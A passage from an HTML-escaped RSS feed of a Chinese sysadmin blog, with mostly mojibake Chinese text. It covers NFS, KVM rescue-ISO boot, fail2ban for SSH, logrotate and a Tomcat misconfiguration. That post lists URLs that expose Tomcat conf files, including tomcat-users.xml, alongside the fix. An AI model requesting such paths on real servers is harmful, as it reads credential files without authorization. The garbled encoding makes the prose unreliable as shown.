&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; --now nfs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;å®¢æˆ·ç«¯ä¸ç”¨å¯ç”¨ä»»ä½•æœåŠ¡&#34;&gt;å®¢æˆ·ç«¯ä¸ç”¨å¯ç”¨ä»»ä½•æœåŠ¡&lt;/h2&gt;
&lt;h2 id=&#34;æœåŠ¡ç«¯æ£€æŸ¥æ˜¯å¦å®‰è£…nfs&#34;&gt;æœåŠ¡ç«¯æ£€æŸ¥æ˜¯å¦å®‰è£…nfsï¼š&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rpm -qa &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep nfsä¸ rpm -qa &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep rpcbindå³å¯
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;åœæ­¢æœåŠ¡ç«¯çš„nfs-serverçš„æ–¹æ³•&#34;&gt;åœæ­¢æœåŠ¡ç«¯çš„nfs serverçš„æ–¹æ³•ï¼š&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl stop nfs
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl stop rpcbind
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;é…ç½®å…±äº«ç›®å½•&#34;&gt;é…ç½®å…±äº«ç›®å½•&lt;/h2&gt;
&lt;p&gt;åœ¨æœåŠ¡ç«¯é…ç½®ä¸€ä¸ªå…±äº«ç›®å½•&lt;/p&gt;</description>
    </item>
    <item>
      <title>Kvmè™šæ‹ŸæœºæŒ‚è½½ä¸´æ—¶æ€¥æ•‘isoå¯åŠ¨çš„æ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20231228-kvm_isoboot/</link>
      <pubDate>Thu, 28 Dec 2023 09:08:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231228-kvm_isoboot/</guid>
      <description>&lt;h4 id=&#34;kvmè™šæ‹ŸæœºæŒ‚è½½ä¸´æ—¶æ€¥æ•‘isoå¯åŠ¨çš„æ–¹æ³•&#34;&gt;Kvmè™šæ‹ŸæœºæŒ‚è½½ä¸´æ—¶æ€¥æ•‘isoå¯åŠ¨çš„æ–¹æ³•ï¼š&lt;/h4&gt;
&lt;p&gt;é¦–å…ˆå»åˆ°å®¿ä¸»æœº&lt;/p&gt;
&lt;p&gt;ç¼–è¾‘è™šæœºæ–‡ä»¶virsh edit vis-18-32-6&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;disk &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;device&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cdrom&amp;#39;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;driver &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;qemu&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;raw&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;target &lt;span class=&#34;nv&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hda&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;bus&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ide&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;readonly/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;address &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;drive&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;controller&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;bus&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;unit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/disk&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨targetä¸‹é¢å¢åŠ ä¸€è¡Œsourceï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;disk &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;device&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cdrom&amp;#39;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;driver &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;qemu&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;raw&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;target &lt;span class=&#34;nv&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hda&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;bus&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ide&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	  &amp;lt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/export/kvm/systemrescuecd-x86-5.2.2.iso&amp;#34;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;readonly/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;address &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;drive&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;controller&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;bus&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;unit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/disk&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å†ä¿®æ”¹bootä¸ºcdromï¼Œæ”¹å›å»åˆ™æ˜¯hd&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;os&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;&lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;x86_64&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;machine&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pc-i440fx-rhel7.0.0&amp;#39;&lt;/span&gt;&amp;gt;hvm&amp;lt;/type&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;boot &lt;span class=&#34;nv&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cdrom&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/os&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå¯åŠ¨è™šæœºå°±å¯ä»¥äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>shellè„šæœ¬çš„ä¸€ä¸ªå¥½çš„å¸®åŠ©ä¿¡æ¯</title>
      <link>https://rendoumi.com/posts/20231228-shell_prompt/</link>
      <pubDate>Thu, 28 Dec 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231228-shell_prompt/</guid>
      <description>&lt;h4 id=&#34;shellè„šæœ¬å¥½çš„å¸®åŠ©ä¿¡æ¯çš„ä¾‹å­&#34;&gt;Shellè„šæœ¬å¥½çš„å¸®åŠ©ä¿¡æ¯çš„ä¾‹å­&lt;/h4&gt;
&lt;p&gt;ä¸€ä¸ªå¥½çš„è„šæœ¬ï¼Œå¿…é¡»æœ‰å¥½çš„å¸®åŠ©ä¿¡æ¯&lt;/p&gt;
&lt;p&gt;ç»™ä¸€ä¸ªæ¯”è¾ƒç®€æ´çš„ä¾‹å­&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
###
### my-script â€” does one thing well
###
### Usage:
###   my-script &amp;lt;input&amp;gt; &amp;lt;output&amp;gt;
###
### Options:
###   &amp;lt;input&amp;gt;   Input file to read.
###   &amp;lt;output&amp;gt;  Output file to write. Use &#39;-&#39; for stdout.
###   -h        Show this message.

help() {
    awk -F&#39;### &#39; &#39;/^###/ { print $2 }&#39; &amp;quot;$0&amp;quot;
}

if [[ $# == 0 ]] || [[ &amp;quot;$1&amp;quot; == &amp;quot;-h&amp;quot; ]]; then
    help
    exit 1
fi

echo Hello World
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»¥å‰ä¸‘é™‹çš„ç”¨æ³•çœŸæ˜¯æ²¡æ³•çœ‹ï¼ï¼ï¼&lt;/p&gt;</description>
    </item>
    <item>
      <title>Nodejsç¦æ­¢åå°å·å·å‡çº§</title>
      <link>https://rendoumi.com/posts/20231228-nodejs_noupgrade/</link>
      <pubDate>Thu, 28 Dec 2023 09:03:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231228-nodejs_noupgrade/</guid>
      <description>&lt;h4 id=&#34;nodejsç¦æ­¢åå°å·å·å‡çº§&#34;&gt;Nodejsç¦æ­¢åå°å·å·å‡çº§&lt;/h4&gt;
&lt;p&gt;å»åˆ°172.18.31.2ä¸Šï¼Œä¼šçœ‹åˆ°å¾ˆå¤šnodeè¿›ç¨‹&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231228-nodejs_noupgrade/2021-05-02_225810.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœ‰ç—…å™»ï¼Œç³»ç»Ÿéƒ½æ²¡æœ‰è¿è¡Œnodeç¨‹åºã€‚å”¯ä¸€çš„ç¨‹åºæ˜¯nci-ansible-ui-quick-setupï¼Œåœ¨/export/serverä¸‹ï¼Œè¿˜æ²¡æœ‰è¿è¡Œï¼Œå‡çº§ä¸ªèŒ„å­å™»ã€‚&lt;/p&gt;
&lt;p&gt;å…¨æ€æ‰ï¼Œç„¶åå…¨å±€ç¦æ­¢å‡çº§å³å¯&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;npm config set update-notifier false --global
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç¬¬ä¸€æ¬¡è¿è¡Œä¼šæœ‰ä¸ªæç¤ºï¼Œå†è¿è¡Œå°±æ²¡æœ‰äº†ã€‚
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231228-nodejs_noupgrade/2021-05-02_230050.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Tomcaté…ç½®ä¸å½“å¯¼è‡´æ–‡ä»¶æ³„éœ²</title>
      <link>https://rendoumi.com/posts/20231228-tomcat_config/</link>
      <pubDate>Thu, 28 Dec 2023 09:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231228-tomcat_config/</guid>
      <description>&lt;h4 id=&#34;tomcaté…ç½®ä¸å½“å¯¼è‡´æ–‡ä»¶æ³„éœ²&#34;&gt;Tomcaté…ç½®ä¸å½“å¯¼è‡´æ–‡ä»¶æ³„éœ²&lt;/h4&gt;
&lt;p&gt;è¯´æ˜ï¼šTomcatç”±äºé…ç½®ä¸å½“ä¼šå¯¼è‡´tomcat/conf log webapps work temp bin libç­‰ä¿¡æ¯æš´éœ²åœ¨æ¸¸è§ˆå™¨ä¸­
ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.89.38:8080/conf/catalina.policy
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.89.38:8080/conf/catalina.properties
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.89.38:8080/conf/context.xml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.89.38:8080/conf/logging.properties
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.89.38:8080/conf/server.xml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.89.38:8080/conf/tomcat-users.xml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.89.38:8080/conf/web.xml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿®å¤æ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å°† /export/servers/tomcat ä¸‹çš„ server.xml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;Host &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;appBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;  æ”¹æˆ  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;Host &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;appBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;webapps&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;appBaseåƒä¸‡ä¸èƒ½ä¸ºç©º
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿®æ”¹å®Œåé‡å¯ç”Ÿæ•ˆ&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç”¨fail2banç®€ç®€å•å•å°æ‰sshç«¯å£çš„è¯•æ¢</title>
      <link>https://rendoumi.com/posts/20231228-fail2ban/</link>
      <pubDate>Thu, 28 Dec 2023 08:50:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231228-fail2ban/</guid>
      <description>&lt;h4 id=&#34;ç”¨fail2banç®€ç®€å•å•å°æ‰sshç«¯å£çš„è¯•æ¢&#34;&gt;ç”¨fail2banç®€ç®€å•å•å°æ‰sshç«¯å£çš„è¯•æ¢&lt;/h4&gt;
&lt;p&gt;æœ‰äººä¸åœè¯•æ¢ç™»å½•22ç«¯å£çš„opensshæœåŠ¡ï¼Œipé‡å¾ˆå¤§çš„è¯ï¼Œæ¯”å¦‚1000å¤šipè®ºç•ªæ¥ï¼Œä¼šå¯¼è‡´æœåŠ¡çš„Loadavgå‡é«˜åˆ°7å·¦å³ï¼Œç³»ç»Ÿè¿›ç¨‹å†…sshè¾¾åˆ°1000å¤šï¼Œå¾ˆå›°æ‰°&lt;/p&gt;
&lt;p&gt;å¦‚æœæ”¹æ‰sshdçš„ç¼ºçœç«¯å£22ï¼Œé‚£ä¹ˆscpä»¥åŠsftpçš„æ—¶å€™ä¼šå¸¦æ¥å¾ˆå¤§éº»çƒ¦&lt;/p&gt;
&lt;p&gt;è¿™ç§æƒ…å†µå°±è£…ä¸ªfail2banå°±å¥½ï¼Œæ³¨æ„ï¼ŒCentos 7ç°åœ¨ç”¨çš„æ˜¯fiewalldï¼Œæ‰€ä»¥fail2banå¯ä»¥ç”¨ufwæˆ–è€…iptablesï¼Œå»ºè®®ç”¨iptablesï¼Œæ¯”è¾ƒå®¹æ˜“çœ‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å®‰è£…&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install -y epel-release
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install -y fail2ban
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€ä¸»è¦çš„å°±æ˜¯ä¿®æ”¹/etc/fail2ban/jail.conf&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#vi /etc/fail2ban/jail.conf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sshd-iptalbes&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;enabled&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; sshd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;action&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; iptables&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;SSH, &lt;span class=&#34;nv&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ssh, &lt;span class=&#34;nv&#34;&gt;protocol&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tcp&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;logpath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /var/log/secure
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;maxretry&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;bantime&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;86400&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢ç”¨çš„æ˜¯iptablesï¼Œä¸‰æ¬¡å°è¯•å¤±è´¥å°±banä¸€å¤©ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç”¨logrotateè§£å†³catalinna.outè¿‡å¤§çš„é—®é¢˜</title>
      <link>https://rendoumi.com/posts/20231228-logrotate/</link>
      <pubDate>Thu, 28 Dec 2023 08:45:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231228-logrotate/</guid>
      <description>&lt;h4 id=&#34;ç”¨logrotateè§£å†³catalinnaoutè¿‡å¤§çš„é—®é¢˜&#34;&gt;ç”¨logrotateè§£å†³catalinna.outè¿‡å¤§çš„é—®é¢˜&lt;/h4&gt;
&lt;p&gt;æˆ‘ä»¬çš„tomcatçš„catalina.outåŸºæœ¬è¿è¡Œä¸€æ®µæ—¶é—´åä¼šå‡ºç°æ–‡ä»¶è¿‡å¤§çš„é—®é¢˜ï¼Œå¤„ç†ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;å‰ææ˜¯/export/servers/tomcat/ä¸‹éœ€è¦å»ºç«‹ä¸ªè½¯é“¾æ¥tomcatï¼ŒæŒ‡å‘ç°åœ¨æ­£åœ¨ç”¨çš„tomcatç‰ˆæœ¬&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231228-logrotate/2021-06-18_110807.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå°±å¯ä»¥ç”¨logrotateæ¥è§£å†³catalina.outçš„æ—¥å¿—è½®è½¬é—®é¢˜ã€‚è¿™ç§æ–¹å¼æ¯”è¾ƒç®€å•ã€‚åœ¨/etc/logrotate.d/ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåä¸ºtomcatçš„æ–‡ä»¶ï¼Œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &amp;gt;/etc/logrotate.d/tomcat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF
